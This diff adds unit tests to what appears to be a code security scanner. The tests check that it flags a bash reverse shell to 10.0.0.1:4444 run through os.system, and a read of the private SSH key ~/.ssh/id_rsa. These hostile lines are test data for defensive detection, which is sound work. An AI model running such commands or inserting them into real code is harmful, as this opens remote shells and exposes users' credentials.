@@ -22,6 +22,18 @@ def test_scan_eval_code_execution():
     assert any("eval/exec" in f["label"] for f in findings)
 
 
+def test_scan_reverse_shell():
+    code = 'os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")'
+    findings = scan_content(code, filename="backdoor.py")
+    assert any("Reverse Shell" in f["label"] for f in findings)
+
+
+def test_scan_credential_file_access():
+    code = 'with open("~/.ssh/id_rsa") as f: key = f.read()'
+    findings = scan_content(code, filename="exfil.py")
+    assert any("Credential File" in f["label"] for f in findings)
+
+
 def test_scan_clean_code():
     code = """
     import os
